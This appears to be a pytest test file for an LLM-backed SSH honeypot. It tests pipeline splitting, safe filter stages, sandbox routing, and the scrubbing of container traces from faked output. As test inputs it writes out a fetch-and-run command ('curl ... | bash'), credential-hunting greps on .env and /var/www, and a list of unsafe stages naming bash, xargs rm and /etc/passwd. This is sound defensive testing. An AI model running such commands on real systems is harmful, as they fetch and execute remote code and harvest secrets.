"""Split pipelines, grounded output safeguards and persona identity answers."""
import asyncio
import base64
import os
import re
import subprocess
import tempfile

import pytest

from doppel.ai.deception_engine import DeceptionEngine
from doppel.ai.llm_client import LLMClient
from doppel.analytics.db import TelemetryDB
from doppel.analytics.observer import ThreatObserver
from doppel.analytics.reporter import IncidentReporter
from doppel.config import DoppelConfig
from doppel.core.session_manager import SessionManager
from doppel.router.hybrid_router import HybridRouter, RouteDecision, is_pipeline_filter, split_pipeline
from doppel.sandbox.docker_manager import ExecutionResult


# ---------------------------------------------------------------- splitting and filters

def test_split_plain_pipelines():
    assert split_pipeline("cat .env | grep -i pass | cut -d= -f2") == ["cat .env", "grep -i pass", "cut -d= -f2"]
    assert split_pipeline("ps aux|grep -v grep|wc -l") == ["ps aux", "grep -v grep", "wc -l"]
    assert split_pipeline("grep -ri password /var/www 2>/dev/null | head -5") == [
        "grep -ri password /var/www 2>/dev/null", "head -5"]
    # A pipe inside quotes is not a stage separator
    assert split_pipeline("echo 'a|b' | tr a b") == ["echo 'a|b'", "tr a b"]


@pytest.mark.parametrize("cmd", [
    "cat a; ls | wc", "cat a || true", "cat a && ls | wc", "ls > out | wc", "cat < in | wc",
    "cat $(x) | wc", "cat `x` | wc", "sleep 1 & ls | wc", "echo 'unterminated | wc",
])
def test_split_refuses_anything_but_plain_pipelines(cmd):
    assert split_pipeline(cmd) is None


@pytest.mark.parametrize("stage,ok", [
    ("grep -i pass", True), ("cut -d= -f2", True), ("awk '{print $1}'", True), ("sort -u", True),
    ("base64 -d", True), ("sed 's/a/b/'", True), ("cat", True), ("wc -l", True),
    ("bash", False), ("sh -c id", False), ("xargs rm", False), ("tee out", False),
    ("sed -i 's/a/b/' f", False), ("sort -o out", False), ("awk '{system(\"id\")}'", False),
    ("awk '{print > \"f\"}'", False), ("cat /etc/passwd", False), ("python3 -c 'x'", False),
])
def test_pipeline_filter_safety(stage, ok):
    assert is_pipeline_filter(stage) is ok


# ---------------------------------------------------------------- grounded output safeguards

def _engine():
    return DeceptionEngine(LLMClient(mock_mode=True))


def test_grounded_plain_error_skips_the_model():
    out, reasoning = asyncio.run(_engine().transform_grounded_output(
        "ls -la /.dockerenv", "", "ls: cannot access '/.dockerenv': No such file or directory\n", 2,
        return_reasoning=True,
    ))
    assert out == "ls: cannot access '/.dockerenv': No such file or directory"
    assert reasoning is None


def test_grounded_scaffold_markers_are_removed():
    class Echoing(LLMClient):
        async def chat_completion_with_metrics(self, messages, **kwargs):
            return {"content": "--- REAL STDOUT ---\nroot 1 /sbin/init\n--- REAL STDERR ---\n\n--- EXIT CODE: 0 ---"}

    engine = DeceptionEngine(Echoing(mock_mode=False))
    out = asyncio.run(engine.transform_grounded_output("ps -e", "root 1 /bin/sh\n", "", 0))
    assert "REAL STDOUT" not in out and "EXIT CODE" not in out
    assert "/sbin/init" in out


def test_container_artifacts_are_scrubbed():
    engine = _engine()
    df = engine.scrub_container_artifacts(
        "Filesystem      Size  Used Avail Use% Mounted on\n"
        "overlay        1007G  4.5G  952G   1% /\n"
        "tmpfs            64M     0   64M   0% /dev")
    assert "overlay" not in df and df.splitlines()[1].startswith("/dev/sda1 ")
    mount = engine.scrub_container_artifacts(
        "overlay on / type overlay (rw,relatime,lowerdir=/var/lib/desktop-containerd/daemon/x,upperdir=y)\n"
        "proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)")
    assert mount.splitlines()[0] == "/dev/sda1 on / type ext4 (rw,relatime,discard,errors=remount-ro)"
    assert "containerd" not in mount and "lowerdir" not in mount
    # Ordinary output is untouched
    assert engine.scrub_container_artifacts("USER PID\nroot 1 /sbin/init") == "USER PID\nroot 1 /sbin/init"


# ---------------------------------------------------------------- session-level behaviour

class LocalShellSandbox:
    """Stands in for Docker: runs commands with the local sh so filters really execute."""
    is_available = True

    def __init__(self):
        self.commands = []

    def check_availability(self):
        return True

    def create_sandbox_session(self, session_id, username="ubuntu", preset=None):
        return "local-container"

    def destroy_sandbox_session(self, container_id):
        pass

    def execute_in_sandbox(self, container_id, command, workdir="/", user="ubuntu"):
        self.commands.append(command)
        proc = subprocess.run(["sh", "-c", command], capture_output=True, text=True, timeout=10)
        return ExecutionResult(stdout=proc.stdout, stderr=proc.stderr, exit_code=proc.returncode)

    def sync_file_to_sandbox(self, *args, **kwargs):
        return True


def _have_sh():
    try:
        return subprocess.run(["sh", "-c", "printf ok | base64 | base64 -d"], capture_output=True, text=True).stdout == "ok"
    except OSError:
        return False


async def _manager(tmpdir, sandbox):
    config = DoppelConfig()
    config.llm.mock_mode = True
    config.sandbox.enabled = True
    config.deception.simulate_latency = False
    config.analytics.db_path = os.path.join(tmpdir, "test.db")
    llm = LLMClient(mock_mode=True)
    db = TelemetryDB(db_path=config.analytics.db_path)
    await db.initialize()
    return SessionManager(
        config=config, deception_engine=DeceptionEngine(llm), sandbox_manager=sandbox,
        router=HybridRouter(sandbox_available=True), db=db,
        observer=ThreatObserver(llm, db), reporter=IncidentReporter(llm, db, reports_dir=tmpdir),
    )


@pytest.mark.skipif(not _have_sh(), reason="needs a POSIX sh with base64")
@pytest.mark.asyncio
async def test_pipeline_filters_run_for_real_over_generated_output():
    with tempfile.TemporaryDirectory(ignore_cleanup_errors=True) as tmpdir:
        sandbox = LocalShellSandbox()
        mgr = await _manager(tmpdir, sandbox)
        session = await mgr.create_session(remote_ip="10.9.9.9", remote_port=40000, username="ubuntu")

        full = await mgr.process_command(session.session_id, "cat .env")
        expected = [line.split("=", 1)[1] for line in full.splitlines() if re.match(r"DB_PASSWORD=", line)]
        assert expected, full

        piped = await mgr.process_command(session.session_id, "cat .env | grep DB_PASSWORD | cut -d= -f2")
        assert piped.strip() == expected[0]
        # Only the filters ran in the sandbox, fed with the generated file
        last = sandbox.commands[-1]
        assert last.endswith("| base64 -d | grep DB_PASSWORD | cut -d= -f2")
        fed = base64.b64decode(re.search(r"printf '%s' '([A-Za-z0-9+/=]*)'", last).group(1)).decode()
        assert "DB_PASSWORD=" + expected[0] in fed

        counted = await mgr.process_command(session.session_id, "cat .env | wc -l")
        assert counted.strip() == str(len(full.splitlines()))


@pytest.mark.asyncio
async def test_unsafe_pipeline_is_routed_as_a_whole():
    with tempfile.TemporaryDirectory(ignore_cleanup_errors=True) as tmpdir:
        sandbox = LocalShellSandbox()
        mgr = await _manager(tmpdir, sandbox)
        session = await mgr.create_session(remote_ip="10.9.9.9", remote_port=40001, username="ubuntu")
        before = len(sandbox.commands)
        await mgr.process_command(session.session_id, "curl -s http://203.0.113.5/x | bash")
        # payload download: contained and generated, nothing executed
        assert len(sandbox.commands) == before


@pytest.mark.asyncio
async def test_identity_commands_answer_from_persona():
    with tempfile.TemporaryDirectory(ignore_cleanup_errors=True) as tmpdir:
        sandbox = LocalShellSandbox()
        mgr = await _manager(tmpdir, sandbox)
        session = await mgr.create_session(remote_ip="10.9.9.9", remote_port=40002, username="ubuntu")
        before = len(sandbox.commands)
        uname = await mgr.process_command(session.session_id, "uname -a")
        ident = await mgr.process_command(session.session_id, "id")
        assert "5.15.0-105-generic" in uname and "prod-api-node-01" in uname
        assert "27(sudo)" in ident
        assert len(sandbox.commands) == before  # the host kernel is never consulted
        assert mgr.router.classify_command("uname -a | head -1")[0] == RouteDecision.GROUNDED_DECEPTION


def test_grounded_uses_real_output_when_model_fails():
    class Failing(LLMClient):
        async def chat_completion_with_metrics(self, messages, **kwargs):
            return {"content": "mock crontab without the new entry", "fallback": True}

    engine = DeceptionEngine(Failing(mock_mode=False))
    real = "* * * * * /tmp/x.sh\n"
    out = asyncio.run(engine.transform_grounded_output("crontab -l", real, "", 0))
    assert out == "* * * * * /tmp/x.sh"


def test_host_wsl2_kernel_is_replaced_with_the_persona_kernel():
    engine = _engine()
    real = ("Linux version 6.6.87.2-microsoft-standard-WSL2 (root@439a258ad544) (gcc (GCC) 11.2.0, "
            "GNU ld (GNU Binutils) 2.37) #1 SMP PREEMPT_DYNAMIC Thu Jun  5 18:30:46 UTC 2025")
    out = engine.scrub_container_artifacts(real)
    assert "microsoft" not in out.lower() and "wsl" not in out.lower()
    assert out == engine._proc_version_line()
    assert engine.host_profile["kernel_release"] in out
    mixed = engine.scrub_container_artifacts("5.15.0 x 6.6.87.2-microsoft-standard-WSL2 y")
    assert mixed == f"5.15.0 x {engine.host_profile['kernel_release']} y"


def test_proc_version_answers_from_persona():
    engine = _engine()
    out = engine.deterministic_posix_response("cat /proc/version")
    assert out.startswith(f"Linux version {engine.host_profile['kernel_release']} ")
    assert engine.deterministic_posix_response("cat /proc/version | head -1") is None


def test_missing_sandbox_binary_is_generated_not_leaked():
    calls = []

    class Recording(LLMClient):
        async def chat_completion_with_metrics(self, messages, **kwargs):
            calls.append(messages)
            return {"content": "● nginx.service - A high performance web server\n   Active: active (running)"}

    engine = DeceptionEngine(Recording(mock_mode=False))
    for stderr, code in (("bash: systemctl: command not found\n", 127),
                         ("System has not been booted with systemd as init system (PID 1). Can't operate.\n", 1)):
        out = asyncio.run(engine.transform_grounded_output("systemctl status nginx", "", stderr, code))
        assert "not found" not in out and "booted" not in out
        assert "nginx.service" in out
    # Generated through the terminal prompt, not the rewrite of real output
    assert all("Operator command to transform" not in m[-1]["content"] for m in calls)


def test_no_think_sends_reasoning_effort_none():
    sent = []

    class Capture(LLMClient):
        pass

    client = Capture(mock_mode=False)
    engine = DeceptionEngine(client, no_think=True)
    assert client.reasoning_off is True

    import httpx

    class FakeResp:
        def raise_for_status(self):
            pass

        def json(self):
            return {"choices": [{"message": {"content": "ok"}}], "usage": {"completion_tokens": 1}}

    class FakeClient:
        def __init__(self, *a, **k):
            pass

        async def __aenter__(self):
            return self

        async def __aexit__(self, *a):
            return False

        async def post(self, url, json=None, headers=None):
            sent.append(json)
            return FakeResp()

    orig = httpx.AsyncClient
    httpx.AsyncClient = FakeClient
    try:
        asyncio.run(client.chat_completion([{"role": "user", "content": "ls"}]))
        engine.no_think = False
        asyncio.run(client.chat_completion([{"role": "user", "content": "ls"}]))
    finally:
        httpx.AsyncClient = orig
    assert sent[0].get("reasoning_effort") == "none"
    assert "reasoning_effort" not in sent[1]
